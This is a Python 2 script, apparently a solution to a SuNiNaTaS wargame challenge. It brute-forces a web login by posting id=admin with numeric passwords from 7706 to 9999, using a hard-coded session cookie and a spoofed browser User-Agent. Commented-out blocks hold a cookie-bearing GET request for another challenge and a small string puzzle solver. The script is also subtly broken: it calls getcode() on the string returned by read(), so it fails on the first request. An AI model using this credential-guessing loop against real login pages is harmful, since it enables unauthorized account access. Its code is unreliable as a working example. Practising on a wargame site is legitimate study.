# -*- coding: cp949 -*-
import urllib2  #URL 요청을 위한 헤더를 설정하기 위한 Request 객체 수용
import urllib #URL만을 수용한다.
#https://www.programcreek.com/python/example/260/urllib2.build_opener
#https://kite.com/python/docs/urllib2
url = "http://suninatas.com/Part_one/web08/web08.asp"

for i in range(7706, 10000):
    #http_logger = urllib2.HTTPHandler(debuglevel = 1)
    #log_opener = urllib2.build_opener(http_logger) # put your other handlers here too!
    #urllib2.install_opener(log_opener)
    opener = urllib2.build_opener(urllib2.HTTPHandler)
    request = urllib2.Request(url, data = "id=admin&pw="+str(i))
    request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
    request.add_header('Cookie', 'ASPSESSIONIDSSSDDTCC=EHJGAGDDJCOBFCNMEIJLMODF;')
    request.get_method = lambda:'POST'
    data = opener.open(request)
    response = data.read()
    print(response.getcode()) #response.getcode()
    #print "[*] Request id=admin&pw="+str(i)
    if "Incorrect" not in response:
        #print "[*] Find it!! password is "+str(i)
        break 
'''
# GET 방식
url='http://suninatas.com/Part_one/web07/web07.asp'
request = urllib2.Request(url)
request.add_header('Cookie','ASPSESSIONIDASASDRCS=JDIGAGDDDACIBNIMOOIFFCFJ')
response = urllib2.urlopen(request)
print (response.read())
'''
'''
res3=""
while True:
    __str=input(":")
    res = __str.replace("a","aad")
    print( " ==1> : {}".format(res))

    res = res.replace("i","in")
    print( " ==2>  : {}".format(res))
    print("result -> {}".format(res))
    res1 = res[1:3]
    print("res1 %s"%res1)
    res2 = res[3:10]
    print("res2 %s"%(res2))
    res3=res1+res2
    print("result ->  {}".format(res3))
    if res3 == "admin":
        print("@@@@@@@@@@@@@@@")
        break
'''
